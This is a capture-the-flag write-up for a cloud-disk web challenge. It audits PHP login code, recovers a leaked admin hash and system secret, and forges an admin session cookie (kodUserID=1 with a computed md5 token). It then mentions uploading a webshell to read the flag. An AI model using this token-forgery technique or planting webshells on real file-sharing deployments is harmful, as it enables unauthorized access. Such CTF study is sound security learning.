

## my-private-cloud-disk

its the most difficult of web category this game,You need to do a code audit 

First we can login by guest guest no admin permission we can't read /flag  so we need to login as admin first

search admin 

In system_member.php we can get

```
"name": "admin",
"path": "admin",
"password": "3cdacd625a9b6d55407e0a81a7a13c1b",
"userID": "1",
```

we can get password but we can't decode it, so we need to explore more

Notice this app/controller/user.class.php

```
	public function loginCheck(){
		// CSRF-TOKEN更新后同步;关闭X-CSRF-TOKEN的httpOnly
		if( ACT == 'commonJs' && isset($_SESSION['X-CSRF-TOKEN'])){
			$this->_setCsrfToken();
		}
		if(in_array(ST,$this->notCheckST)) return;//不需要判断的控制器
		if(in_array(ACT,$this->notCheckACT))   return;//不需要判断的action
		if(in_array(ST.'.'.ACT,$this->notCheckApp))   return;//不需要判断的对应入口

		if(isset($_SESSION['kodLogin']) && $_SESSION['kodLogin']===true && $this->user){
			$user = systemMember::getInfo($this->user['userID']);
			$this->_loginSuccess($user);
			return;
		}else if($_COOKIE['kodUserID']!='' && $_COOKIE['kodToken']!=''){
			$user = systemMember::getInfo($_COOKIE['kodUserID']);
			if (!is_array($user) || !isset($user['password'])) {
				$this->logout();
			}
			if($this->_makeLoginToken($user) === $_COOKIE['kodToken']){
				@session_start();//re start
				$_SESSION['kodLogin'] = true;
				$_SESSION['kodUser']= $user;
				$_SESSION['X-CSRF-TOKEN'] = rand_string(20);
				$this->_setCsrfToken();
				setcookie('kodUserID', $_COOKIE['kodUserID'], time()+3600*24*100);
				setcookie('kodToken',$_COOKIE['kodToken'],time()+3600*24*100);

				//check if session work
				@session_write_close();
				unset($_SESSION);
				@session_start();
				if( !isset($_SESSION['kodUser']) || 
					!is_array($_SESSION['kodUser'])){
					$this->login(DATA_PATH."<br/>".LNG('path_can_not_write_data') );
				}else{
					$this->_loginSuccess($user);
				}
				return;
			}
			$this->logout();//session user数据不存在
		}else{
			if ($this->config['settingSystem']['autoLogin'] != '1') {
				$this->logout();//不自动登录
			}else{
				if (!file_exists(USER_SYSTEM.'install.lock')) {
					$this->display('install.html');
					exit;
				}
				header('location:./index.php?user/loginSubmit&name=guest&password=guest');
				exit;
			}
		}
	}
```

```php
$user = systemMember::getInfo($this->user['userID']);
		$this->_loginSuccess($user);
if($this->_makeLoginToken($user) === $_COOKIE['kodToken'])
```

 $user is userID  if we input 1 that means admin and I noticed _makeLoginToken function 

```
//登陆token
	private function _makeLoginToken($userInfo){
		//$ua = $_SERVER['HTTP_USER_AGENT'];
		$system_pass = $this->config['settingSystem']['systemPassword'];
		return md5($userInfo['password'].$system_pass.$userInfo['userID']);
	}
```

if we know systemPassword we can get Token md5

we can find systemPassword in system_setting.php

```
"systemPassword": "xC2HhA5ikbJjEMUBASd3",
```

finally generate md5 use

```
/index.php?user/loginCheck

Cookie=kodUserID=1;kodToken=4f9747565d4dbcb9439016c9694bde9d
```

and we can login as admin upload a webshell 

and run ./readflag give me the flag

finally flag is MOCSCTF{N0t_A11_Cl0ud_Disk_1S_SSSAFE}